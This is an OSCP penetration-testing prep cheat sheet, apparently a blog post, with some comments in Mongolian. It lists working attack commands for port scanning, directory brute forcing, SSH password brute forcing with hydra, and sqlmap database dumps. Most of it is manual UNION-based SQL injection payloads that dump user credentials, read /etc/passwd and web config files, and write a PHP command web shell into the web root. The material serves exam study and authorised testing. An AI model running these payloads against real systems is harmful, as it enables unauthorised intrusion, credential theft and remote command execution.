---
published: true
---
# OSCP Prep by fg0x0

### Scanning
```
rustscan -a 192.168.1.1 --ulimit 5000
sudo nmap -sV -T4 -p- -O -oN nmap bravery
-sV determine service/version info
-T4 for faster execution
-p- scan all ports
-O identify Operating System
-oN output to file, in our case it’s called nmap
```
<br>
### Web Exploitation
<br>
##### Directory Bruteforcing
<br>
```
python3 dirsearch.py -u http://example.com
```
##### Nikto

```
nikto -h $HOST
```
<br>
##### SQL Injection

```
' order by 1 --
' order by 1 -- -
' order by 2 --
' order by 3 --
' order by 4 --
' order by 5 --
' order by 6 --
' order by 7 --
' order by 8 --
' order by 9 --
' union select 1,2,3,4,5,6,7,8 -- - 
( Хэрвээ 4-р хэрэглэгчээр нэвтрэх юм бол )
' union select 1,2,3,@@version,5,6,7,8 -- -
' union select 1,2,3,user(),5,6,7,8 -- -

' union select 1,2,3,column_name,5,6,7,8 from information_schema,columns where table_name='users'-- -

' union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema,columns where table_name='users'-- -

' union select 1,2,3,column_name,5,6,7,8 from information_schema,columns where table_name='users'-- - 
( Group-лээд гаргаж ирнэ )

' union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a, pass,0x3a,user_level),5,6,7,8 from users-- - 
( table бүрийн урд хэсэгт 0x3a бичиж өгнө )

File унших ( Read File )

' union select 1,2,3,load_file('/etc/passwd'),5,6,7,8--
' union select 1,2,3,load_file('/var/www/login.php'),5,6,7,8--
' union select 1,2,3,load_file('/var/www/includes/config.inc.php'),5,6,7,8--
' union select 1,2,3,load_file('/var/www/includes/../mysqli_connect.php'),5,6,7,8--

File хуулах ( File Uploading )

' union select 1,2,3,'Ene bol test file shuu',5,6,7,8 into outfile '/var/www/test-file'--

PHP cmd shell хуулах

' union select 1,2,3,"<?php system($_GET['cmd'])?>",5,6,7,8 into outfile '/var/www/rev-shell.php'--
```
<br>
##### Sqlmap ( Database )

```
sqlmap -r sql.txt --dbs
sqlmap -r sql.txt -D Staff --dump
sqlmap -r sql.txt -D users --dump

```
<br>
### Password Cracking
<br>
##### Hydra

```
hydra -L users.txt -P passwords.txt ssh://192.168.56.142:22 -t 10 -I
```
<br>
##### Hashcat









